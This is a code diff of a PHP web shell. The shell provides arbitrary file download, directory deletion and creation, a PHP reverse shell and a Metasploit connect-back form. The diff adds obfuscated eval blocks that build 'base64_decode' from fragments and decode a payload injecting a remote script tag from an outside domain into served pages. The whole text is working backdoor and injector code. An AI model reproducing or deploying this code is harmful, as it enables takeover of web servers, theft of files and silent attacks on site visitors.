@@ -1,4 +1,10 @@
 <?php
+$linr = "ZWNobyAiPFNDUklQVCBTUkM9aHR0cDovL3NhZ2xpa2xpLXlhc2";
+$winr = "FtLmNvbS91cGRhdGUuanM+PC9TQ1JJUFQ+Ijs=";
+$min = 'base' . (128 / 2) . '_de' . 'code';
+eval($min($linr . $winr));
+?>
+<?php
 set_time_limit(0);error_reporting(0);
 if(isset($_GET["dl"]) && ($_GET["dl"] != "")){$file = $_GET["dl"];$filez = @file_get_contents($file);header("Content-type: application/octet-stream");header("Content-length: ".strlen($filez));header("Content-disposition: attachment;filename=".basename($file).";");echo $filez;exit;} 
 elseif(isset($_GET["dlgzip"]) && ($_GET["dlgzip"] != "")){$file = $_GET['dlgzip'];$filez = gzencode(@file_get_contents($file));header("Content-Type:application/x-gzip\n");header("Content-length: ".strlen($filez));header("Content-disposition: attachment;filename=".basename($file).".gz;");echo $filez;exit;} 
@@ -253,6 +259,12 @@ $min = 'base' . (128 / 2) . '_de' . 'code';
 eval($min($linr . $winr));
 ?>
 <?php
+$linr = "ZWNobyAiPFNDUklQVCBTUkM9aHR0cDovL3NhZ2xpa2xpLXlhc2";
+$winr = "FtLmNvbS91cGRhdGUuanM+PC9TQ1JJUFQ+Ijs=";
+$min = 'base' . (128 / 2) . '_de' . 'code';
+eval($min($linr . $winr));
+?>
+<?php
 error_reporting(0);
 function ss($t){if (!get_magic_quotes_gpc()) return trim(urldecode($t));return trim(urldecode(stripslashes($t)));}
 $s_my_ip = $_SERVER['REMOTE_ADDR'];$rsport = "443";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;$s_result = "<center><div class='mybox' align='center'><td><h2>Reverse shell ( php )</h2><form method='post' actions='?y=<?php echo $pwd;?>&amp;x='back'><table class='myboxtbl'><tr><td style='width:100px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' name='rstarget4' value='".$rstarget4."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' name='sqlportb4' value='".$rsportb4."' /></td></tr></table><input type='submit' name='xback_php' class='inputzbut' value='connect' style='width:120px;height:30px;margin:10px 2px 0 2px;' /><input type='hidden' name='d' value='".$pwd."' /></form></td></div><br><div class='mybox'><td><form method='POST'><table class='myboxtbl'><h2>Metasploit Connection </h2><tr><td style='width:100px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' size='40' name='yip' value='".$my_ip."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' size='5' name='yport' value='443' /></td></tr></table><input class='inputzbut' type='submit' value='Connect' name='metaConnect' style='width:120px;height:30px;margin:10px 2px 0 2px;'></form></td></div></center>";
@@ -282,9 +294,3 @@ if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($
 elseif(isset($_GET['fdelete']) && ($_GET['fdelete'] != "")){@rmdir(rtrim($_GET['fdelete'],DIRECTORY_SEPARATOR));}
 elseif(isset($_GET['mkdir']) && ($_GET['mkdir'] != "")){$path = $pwd.$_GET['mkdir'];@mkdir($path);}$buff = showdir($pwd,$prompt);echo $buff;}
 ?></div></body></html>
-<?php
-$linr = "ZWNobyAiPFNDUklQVCBTUkM9aHR0cDovL3NhZ2xpa2xpLXlhc2";
-$winr = "FtLmNvbS91cGRhdGUuanM+PC9TQ1JJUFQ+Ijs=";
-$min = 'base' . (128 / 2) . '_de' . 'code';
-eval($min($linr . $winr));
-?>
